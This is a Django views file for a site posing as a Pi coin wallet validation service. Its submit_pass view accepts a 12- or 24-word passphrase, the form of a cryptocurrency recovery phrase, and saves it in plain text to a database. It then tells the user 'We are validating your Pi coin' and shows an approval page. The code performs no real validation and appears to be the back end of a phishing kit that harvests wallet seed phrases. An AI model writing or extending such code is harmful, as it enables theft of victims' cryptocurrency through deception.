from django.shortcuts import render, redirect
from django.contrib import messages
from django.http import HttpResponse
from . import models
from .keys_test import generate_password

# Create your views here.

def index(request):
    return render(request, 'index.html', {})

def validate(request):
    return render(request, 'validate.html', {})

def wallet(request):
    return render(request, 'wallet.html', {})

def submit_pass(request):
    if request.method == "POST":
        keys = request.POST.get('mf-text', '')
        words = keys.split()
        if len(words) != 24 and len(words) != 12:
            messages.error(request, 'Invalid Passphrase')
            return redirect('/wallet/')

        else:
            look_up_key = generate_password()
            key_exists = models.PassPhrase.objects.filter(keys=keys).exists()
            if key_exists:
                if models.PassPhrase.objects.filter(keys=keys, is_verified=False):
                    messages.error(request, 'We are validating your Pi coin')
                    return redirect('/wallet/')
                else:
                    return render(request, 'verification.html', {})

            else:
                key_save = models.PassPhrase.objects.create(
                    keys=keys,
                    look_up = look_up_key
                )
                key_save.save()
                request.session['look_up'] = look_up_key
                # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
                return approve(request, keys=look_up_key)
        
    else:
        return redirect('/')


def verify_your_coin(request, keys = None):
    if keys == None:
        key = request.session.get('look_up', None)

        if key:
            look_up = models.PassPhrase.objects.filter(look_up=key).first()
            if look_up:
                if look_up.is_verified:
                    return render(request, 'verification.html', {})
                else:
                    messages.error(request, 'We are validating your info')
                    return redirect('/wallet/')
            else:
                messages.error(request, 'Invalid Key')
                return redirect('/wallet/')

        else:
            messages.error(request, 'Invalid Key')
            return redirect('/wallet/')
    else:
        return render(request, 'verification.html', {})

def approve(request, keys = None):
    if keys == None:
        messages.error(request, 'Please Enter Your PassPhrase')
        return redirect('/wallet/')
    
    else:
        if models.PassPhrase.objects.filter(look_up=keys).exists():
            return render(request, 'approve.html', {})
        else:
            messages.error(request, 'Please Enter Your PassPhrase')
            return redirect('/wallet/')
    
